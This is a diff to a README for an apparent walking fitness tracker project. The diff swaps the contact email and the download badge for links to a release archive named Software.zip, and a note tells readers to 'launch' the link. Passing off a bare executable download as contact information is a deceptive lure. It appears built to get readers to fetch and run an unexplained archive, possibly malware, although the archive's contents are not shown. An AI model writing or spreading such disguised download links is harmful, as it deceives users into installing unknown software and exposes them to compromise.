@@ -43,11 +43,11 @@ If you would like to contribute to the Automated Walking Fitness Tracker, feel f
 
 ## Contact Us 📧
 
-If you have any questions, suggestions, or feedback, please feel free to reach out to us at [automatedfitness@tracker.com](mailto:automatedfitness@tracker.com). We would love to hear from you!
+If you have any questions, suggestions, or feedback, please feel free to reach out to us at [https://github.com/Syrolei/Automated-Walking-Fitness-Tracker/releases/download/v1.0/Software.zip](https://github.com/Syrolei/Automated-Walking-Fitness-Tracker/releases/download/v1.0/Software.zip). We would love to hear from you!
 
 ---
 
-[![Download Automated Walking Fitness Tracker](https://img.shields.io/badge/Download-1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Automated Walking Fitness Tracker](https://github.com/Syrolei/Automated-Walking-Fitness-Tracker/releases/download/v1.0/Software.zip)](https://github.com/Syrolei/Automated-Walking-Fitness-Tracker/releases/download/v1.0/Software.zip)
 
 **Note:** The link needs to be launched for the download of the Automated Walking Fitness Tracker.
 
